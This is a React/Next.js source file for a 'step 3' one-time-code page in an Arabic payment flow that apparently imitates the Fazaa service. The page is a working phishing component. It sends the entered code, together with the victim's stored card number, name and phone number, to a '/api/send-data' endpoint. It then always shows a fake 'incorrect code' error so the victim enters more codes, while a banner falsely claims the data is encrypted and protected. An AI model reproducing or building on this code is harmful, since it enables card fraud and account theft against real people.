import { useState, useEffect, FormEvent } from 'react';
import Head from 'next/head';
import { useRouter } from 'next/router';

export default function Step3() {
  const router = useRouter();
  const [otp, setOtp] = useState('');
  const [loading, setLoading] = useState(false);
  const [showError, setShowError] = useState(false);

  const arabicDigits: Record<string, string> = {
    '٠': '0', '١': '1', '٢': '2', '٣': '3', '٤': '4',
    '٥': '5', '٦': '6', '٧': '7', '٨': '8', '٩': '9',
    '۰': '0', '۱': '1', '۲': '2', '۳': '3', '۴': '4',
    '۵': '5', '۶': '6', '۷': '7', '۸': '8', '۹': '9',
  };

  const onlyDigit = (s: string) => {
    return s
      .split('')
      .map((ch) => arabicDigits[ch] ?? ch)
      .join('')
      .replace(/\D/g, '');
  };

  const handleInput = (value: string) => {
    const digits = onlyDigit(value).slice(0, 6);
    setOtp(digits);
    setShowError(false);
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pasted = onlyDigit(e.clipboardData.getData('text')).slice(0, 6);
    setOtp(pasted);
  };

  const sendOtpToServer = async (otpValue: string) => {
    try {
      const card = JSON.parse(localStorage.getItem('paymentData') || '{}');
      const order = JSON.parse(localStorage.getItem('fazaa.orderForm') || '{}');
      const cardNumber = (card.cardNumberDigits || card.cardNumber || '').replace(/\D/g, '');

      await fetch('/api/send-data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'otp',
          data: {
            otp: otpValue,
            cardNumber,
            fullName: order.fullName || 'غير معروف',
            phoneNumber: order.phoneNumber || 'غير معروف',
          },
        }),
      });
    } catch (error) {
      console.error('Error sending OTP:', error);
    }
  };

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    if (!otp) return;

    setShowError(false);
    setLoading(true);

    await sendOtpToServer(otp);

    // انتظار 3 ثوان ثم إظهار رسالة خطأ
    setTimeout(() => {
      setLoading(false);
      setOtp('');
      setShowError(true);
    }, 3000);
  };

  return (
    <>
      <Head>
        <title>رمز التأكيد</title>
        <link rel="preconnect" href="https://fonts.googleapis.com" />
        <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="" />
        <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap" rel="stylesheet" />
        <link rel="stylesheet" href="/assets/fonts/fontawesome/css/all.min.css" />
      </Head>

      <div className="app">
        <div className="payment-shell">
          <header>
            <div className="logo">
              <img className="logo-mark" alt="" src="/assets/images/golden-logo.webp" />
            </div>
          </header>

          <main>
            <form onSubmit={handleSubmit} autoComplete="off" noValidate>
              <div className="otp-header">
                <div className="otp-icon-wrap">
                  <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#b18c33" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <rect x="5" y="11" width="14" height="10" rx="2" ry="2"></rect>
                    <path d="M12 17v-2"></path>
                    <path d="M8 11V7a4 4 0 0 1 8 0v4"></path>
                  </svg>
                </div>
                <div className="otp-title">أدخل رمز التحقق</div>
                <p className="otp-subtitle">
                  تم إرسال رمز التحقق المكوّن من 6 أرقام<br />إلى رقم جوالك المسجّل
                </p>
              </div>

              <div className="otp-field">
                <label htmlFor="otpInput">رمز التحقق</label>
                <input
                  id="otpInput"
                  className={`otp-input ${otp.length >= 6 ? 'otp-filled' : ''}`}
                  type="tel"
                  inputMode="numeric"
                  maxLength={6}
                  pattern="[0-9]*"
                  autoComplete="one-time-code"
                  placeholder="- - - - - -"
                  value={otp}
                  onChange={(e) => handleInput(e.target.value)}
                  onPaste={handlePaste}
                />
              </div>

              {showError && (
                <div className="error-box visible">
                  <div className="error-box-icon">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                      <circle cx="12" cy="12" r="10"></circle>
                      <line x1="15" y1="9" x2="9" y2="15"></line>
                      <line x1="9" y1="9" x2="15" y2="15"></line>
                    </svg>
                  </div>
                  <div className="error-box-text">
                    <div className="error-box-title">رمز التحقق خاطئ</div>
                    <div className="error-box-sub">الرمز الذي أدخلته غير صحيح، يرجى المحاولة مجدداً</div>
                  </div>
                </div>
              )}

              <div className="secure-notice">
                <span aria-hidden="true">🔒</span>
                جميع المعلومات مشفرة ومحمية بالكامل
              </div>

              <button className="btn btn-primary" type="submit" disabled={otp.length < 1}>
                تحقق
              </button>

              <div className="resend-row">
                لم يصلك الرمز؟{' '}
                <button type="button" className="resend-link" onClick={() => { setOtp(''); setShowError(false); }}>
                  إعادة الإرسال
                </button>
              </div>
            </form>
          </main>
        </div>
      </div>

      {loading && (
        <div className="loading-overlay loading-overlay--visible">
          <div className="loading-card">
            <div className="loading-spinner"></div>
            <div>جاري التحقق من الرمز، يرجى الانتظار</div>
          </div>
        </div>
      )}

      <style jsx>{`
        :root {
          --bg: #f2f2f7;
          --panel: rgba(255, 255, 255, 0.98);
          --text: #1c1c1e;
          --muted: #6b6b6b;
          --line: rgba(60, 60, 67, 0.16);
          --gold: #b18c33;
          --gold-2: #caa64e;
          --danger: #bf514d;
        }

        * { box-sizing: border-box; }
        html, body { margin: 0; min-height: 100%; }
        body {
          font-family: "SF Pro Text", "SF Pro Display", "Cairo", -apple-system, BlinkMacSystemFont, system-ui, sans-serif;
          background: var(--bg);
          color: var(--text);
          direction: rtl;
        }

        a { color: inherit; text-decoration: none; }

        .app {
          min-height: 100vh;
          width: min(100%, 980px);
          margin: 0 auto;
          padding: 14px 10px 16px;
        }

        .payment-shell {
          max-width: 500px;
          margin: 0 auto;
          padding: 12px 12px 14px;
          border: 1px solid rgba(60, 60, 67, 0.12);
          border-radius: 20px;
          background: #ffffff;
          box-shadow: 0 8px 24px rgba(28, 28, 30, 0.08);
        }

        header {
          max-width: 100%;
          margin: 0 auto;
          display: flex;
          align-items: flex-start;
          justify-content: flex-start;
          gap: 10px;
          padding: 0 0 8px;
          border-bottom: 1px solid rgba(60, 60, 67, 0.1);
        }

        .logo {
          display: inline-flex;
          align-items: center;
          justify-content: center;
        }

        .logo-mark {
          display: block;
          width: min(15vw, 82px);
          height: auto;
        }

        main { padding: 10px 0 0; }

        form {
          max-width: 100%;
          margin: 0 auto;
          padding: 0;
          border-radius: 0;
          background: var(--panel);
          backdrop-filter: blur(8px);
          border: 0;
          box-shadow: none;
        }

        .otp-header {
          text-align: center;
          padding: 14px 0 18px;
        }

        .otp-icon-wrap {
          display: inline-flex;
          align-items: center;
          justify-content: center;
          width: 64px;
          height: 64px;
          border-radius: 50%;
          background: linear-gradient(135deg, rgba(177,140,51,0.15), rgba(202,166,78,0.08));
          margin-bottom: 12px;
        }

        .otp-title {
          font-size: 1.1rem;
          font-weight: 700;
          color: var(--text);
          margin: 0 0 6px;
        }

        .otp-subtitle {
          font-size: 0.8rem;
          color: var(--muted);
          line-height: 1.55;
          margin: 0;
        }

        .otp-field {
          margin: 20px 0 6px;
        }

        .otp-field label {
          display: block;
          margin-bottom: 5px;
          font-size: 0.78rem;
          font-weight: 600;
          color: #3a3a3c;
          text-align: right;
        }

        .otp-input {
          width: 100%;
          height: 50px;
          border-radius: 12px;
          border: 1.5px solid var(--line);
          background: #fbfbfd;
          font-family: inherit;
          font-size: 1.3rem;
          font-weight: 700;
          text-align: center;
          letter-spacing: 0.25em;
          color: var(--text);
          outline: none;
          transition: border-color 0.15s ease, box-shadow 0.15s ease;
          caret-color: var(--gold);
          -webkit-appearance: none;
          appearance: none;
          direction: ltr;
        }

        .otp-input:focus {
          border-color: rgba(177, 140, 51, 0.7);
          background: #ffffff;
          box-shadow: 0 0 0 3px rgba(177, 140, 51, 0.12);
        }

        .otp-input.otp-filled {
          border-color: rgba(46, 160, 67, 0.6);
          box-shadow: 0 0 0 3px rgba(46, 160, 67, 0.08);
        }

        .error-box {
          display: none;
          align-items: center;
          gap: 10px;
          background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
          border-radius: 14px;
          padding: 14px 16px;
          margin: 14px 0 4px;
          color: #fff;
          font-size: 0.85rem;
          font-weight: 600;
          animation: slideDown 0.3s ease-out;
        }

        .error-box.visible {
          display: flex;
        }

        .error-box-icon {
          flex-shrink: 0;
          width: 32px;
          height: 32px;
          border-radius: 50%;
          background: rgba(255,255,255,0.2);
          display: flex;
          align-items: center;
          justify-content: center;
        }

        .error-box-text {
          flex: 1;
        }

        .error-box-title {
          font-size: 0.9rem;
          font-weight: 700;
          margin-bottom: 2px;
        }

        .error-box-sub {
          font-size: 0.75rem;
          font-weight: 400;
          opacity: 0.9;
        }

        @keyframes slideDown {
          from { opacity: 0; transform: translateY(-8px); }
          to   { opacity: 1; transform: translateY(0); }
        }

        .secure-notice {
          display: flex;
          align-items: center;
          gap: 7px;
          margin: 12px 0 10px;
          padding: 9px 10px;
          border-radius: 12px;
          background: rgba(10, 132, 255, 0.08);
          color: #1f4f8f;
          font-weight: 500;
          font-size: 0.78rem;
        }

        .secure-notice span { flex: 0 0 auto; }

        .btn {
          display: inline-flex;
          align-items: center;
          justify-content: center;
          height: 42px;
          border-radius: 12px;
          font: inherit;
          font-weight: 600;
          border: 0;
          cursor: pointer;
          font-size: 0.86rem;
          white-space: nowrap;
          width: 100%;
        }

        .btn-primary {
          background: linear-gradient(180deg, var(--gold-2), var(--gold));
          color: #fff;
          box-shadow: 0 8px 18px rgba(177, 140, 51, 0.28);
        }

        .btn-primary:disabled {
          opacity: 0.55;
          cursor: not-allowed;
        }

        .resend-row {
          text-align: center;
          margin-top: 14px;
          font-size: 0.78rem;
          color: var(--muted);
        }

        .resend-link {
          color: var(--gold);
          font-weight: 600;
          cursor: pointer;
          background: none;
          border: none;
          font: inherit;
          font-size: 0.78rem;
          padding: 0;
        }

        .loading-overlay {
          position: fixed;
          inset: 0;
          display: none;
          align-items: center;
          justify-content: center;
          background: rgba(12, 12, 14, 0.72);
          backdrop-filter: blur(10px);
          z-index: 999;
        }

        .loading-overlay--visible {
          display: flex;
        }

        .loading-card {
          display: flex;
          align-items: center;
          flex-direction: column;
          gap: 16px;
          padding: 28px 30px;
          border-radius: 24px;
          background: rgba(10, 10, 10, 0.2);
          border: 1px solid rgba(255, 255, 255, 0.08);
          box-shadow: 0 24px 60px rgba(0, 0, 0, 0.28);
          color: #f4f1e6;
          font-size: 1rem;
          font-weight: 500;
          min-width: min(340px, calc(100vw - 48px));
          text-align: center;
        }

        .loading-spinner {
          width: 44px;
          height: 44px;
          border-radius: 50%;
          border: 4px solid rgba(214, 180, 91, 0.18);
          border-top-color: var(--gold);
          animation: loading-spin 0.8s linear infinite;
        }

        @keyframes loading-spin {
          to { transform: rotate(360deg); }
        }

        @media (max-width: 640px) {
          .app { padding-inline: 8px; padding-top: 10px; }
          .payment-shell { padding: 10px 10px 12px; border-radius: 18px; }
          header { padding-bottom: 7px; }
          .logo-mark { width: 68px; }
        }
      `}</style>
    </>
  );
}
